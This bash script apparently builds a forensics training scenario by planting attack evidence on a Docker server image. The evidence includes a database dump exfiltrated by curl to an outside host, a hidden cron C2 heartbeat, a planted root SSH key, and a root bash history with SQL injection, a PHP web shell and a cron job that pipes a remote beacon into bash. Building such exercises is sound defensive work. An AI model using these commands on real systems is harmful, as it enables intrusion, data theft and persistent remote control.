#!/bin/bash
# Plant static post-attack artifacts for server_6 at Docker build time.
# These are baked into the image so they are always present.

# --- Auth log (baseline cron sessions) ---
cat /opt/artifacts/auth.log > /var/log/auth.log

# --- Log artifacts ---
cat /opt/artifacts/syslog_attack > /var/log/syslog
mkdir -p /var/log/samba
cp /opt/artifacts/samba_logs /var/log/samba/log.smbd

# --- Malicious shared library (ELF header marker, not real executable) ---
printf '\x7fELF\x02\x01\x01\x00' > /srv/public/libpayload.so
chmod 777 /srv/public/libpayload.so

# --- SSH persistence: attacker planted key for root access ---
mkdir -p /root/.ssh
cp /opt/artifacts/authorized_keys /root/.ssh/authorized_keys
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys

# --- Data exfiltration evidence ---
mkdir -p /tmp/.cache
cat > /tmp/.cache/dump_db.sh << 'SCRIPT'
#!/bin/bash
# Database exfiltration script
PGPASSWORD=postgres pg_dump -U postgres -h 127.0.0.1 portal > /tmp/.cache/db_dump.sql
curl -s -X POST http://192.168.1.50:8443/exfil -d @/tmp/.cache/db_dump.sql
SCRIPT
chmod +x /tmp/.cache/dump_db.sh

cat > /tmp/.cache/db_dump.sql << 'DUMP'
--
-- PostgreSQL database dump (exfiltrated 2026-02-06 10:32:14 UTC)
--

CREATE TABLE users (
    id integer PRIMARY KEY,
    username character varying(64) NOT NULL,
    password character varying(128) NOT NULL,
    role character varying(16) DEFAULT 'user',
    email character varying(128)
);

INSERT INTO users VALUES (1, 'admin', 'pbkdf2:sha256:260000$salt$hashedpassword', 'admin', 'admin@company.local');
INSERT INTO users VALUES (2, 'operator', 'pbkdf2:sha256:260000$salt2$hashedpassword2', 'user', 'operator@company.local');
INSERT INTO users VALUES (3, 'backup_svc', 'pbkdf2:sha256:260000$salt3$hashedpassword3', 'service', 'backup@company.local');

--
-- Dump complete
--
DUMP

# --- Persistence: cron job for C2 callback every 10 minutes ---
cat > /etc/cron.d/.samba_maint << 'CRON'
*/10 * * * * root /var/spool/.cache >/dev/null 2>&1
CRON
chmod 644 /etc/cron.d/.samba_maint

cat > /var/spool/.cache << 'SCRIPT'
#!/bin/bash
# C2 heartbeat
curl -s -o /dev/null http://192.168.1.50:8443/heartbeat?host=$(hostname)&t=$(date +%s) 2>/dev/null || true
SCRIPT
chmod +x /var/spool/.cache

# --- Root bash history showing recon, exfil, and pivot to server_1 ---
cat > /root/.bash_history << 'HIST'
id
whoami
uname -a
cat /etc/passwd
cat /etc/shadow
ip addr
ss -tlnp
ps aux
ssh-keygen -t rsa -N "" -f /root/.ssh/id_rsa
cat /root/.ssh/id_rsa.pub >> /root/.ssh/authorized_keys
pg_dump -U postgres -h 127.0.0.1 portal > /tmp/.cache/db_dump.sql
curl -s -X POST http://192.168.1.50:8443/exfil -d @/tmp/.cache/db_dump.sql
curl -s "http://10.0.2.1/index.php?user=admin' UNION SELECT username,password,role FROM users--&pass=x"
curl -s "http://10.0.2.1/index.php?user=admin' UNION SELECT 1,2,sqlite_version()--&pass=x"
curl -s "http://10.0.2.1/shell.php" -d "cmd=id"
curl -s "http://10.0.2.1/shell.php" -d "cmd=echo '<?php system(\$_GET[\"c\"]); ?>' > /var/www/html/cmd.php"
curl -s "http://10.0.2.1/cmd.php?c=cat+/etc/passwd"
curl -s "http://10.0.2.1/cmd.php?c=cat+/etc/shadow"
curl -s "http://10.0.2.1/cmd.php?c=echo+'*/15 * * * * root curl -s http://192.168.1.50:8443/beacon|bash'+>+/etc/cron.d/.nginx_cache_clean"
HIST
